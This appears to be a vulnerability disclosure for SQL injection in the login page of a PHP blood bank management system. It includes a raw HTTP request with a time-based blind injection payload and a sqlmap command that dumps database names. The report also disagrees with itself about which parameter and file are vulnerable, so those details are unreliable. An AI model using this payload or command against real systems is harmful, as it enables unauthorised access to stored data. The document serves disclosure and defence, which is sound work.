# blood-bank-system-in-php-with-source-code  via to sql injection

****

## NAME OF AFFECTED PRODUCT(S)

**blood-bank-system-in-php**

## Vendor Homepage

https://code-projects.org/blood-bank-system-in-php-with-source-code/

##  **Manufacturers sites:**

https://code-projects.org/

# AFFECTED  VERSION(S)

## Vulnerable File

login.php

## VERSION(S)

-  v1.0

## Software Link

https://download.code-projects.org/details/09f1f26e-072d-4fec-bd3b-974076ee162c

# PROBLEM TYPE

## Vulnerability Type

- sql injection

## Root Cause

The vulnerability file is in the root directory of login.php

You can see that the $pass=$_POST['pass']，and  concatenate $pass to the SQL statement. cause a sql injection vulnerability.

![image-20240826115151682](https://github.com/user-attachments/assets/497c0cfa-5d55-437f-8051-d038df4d97a5)

## Impact

 SQL injection can obtain database information and obtain server permissions.

## **Description of the vulnerability**

**blood-bank-system-in-php**  Index. php has a pass parameter injection vulnerability,it can get the infomation of  databases.

## **Vulnerability recurrence**

We need to set up this **blood-bank-system-in-php** website locally

**POC**

This POC will achieve the effect of a delayed attack

```
POST /login.php HTTP/1.1
Host: bloodbankmgmtsystem
Content-Length: 103
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://bloodbankmgmtsystem
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://bloodbankmgmtsystem/login.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=o71nf37k47i55p6jj4v2ukit3i
Connection: close

tab=on&user=admin' AND (SELECT 4621 FROM (SELECT(SLEEP(4)))mhYE) AND 'hMbH'='hMbH&pass=admin&sub=Log+In
```



**Result**

We  use sqlmap.py to scan it.

Further exploitation: sqlmap directive
Save the packet to a 1.txt file first

```
POST /login.php HTTP/1.1
Host: bloodbankmgmtsystem
Content-Length: 103
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://bloodbankmgmtsystem
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://bloodbankmgmtsystem/login.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=o71nf37k47i55p6jj4v2ukit3i
Connection: close

tab=on&user=admin' AND (SELECT 4621 FROM (SELECT(SLEEP(4)))mhYE) AND 'hMbH'='hMbH&pass=admin&sub=Log+In
```

Execute the sqlmap statement

```
python sqlmap.py -r "C:\1.txt" --dbs
```

You can view the database name and view all the information in the database.

![image-20240826115219916](https://github.com/user-attachments/assets/586be93c-69b8-42c1-b327-6c0bb66e78ab)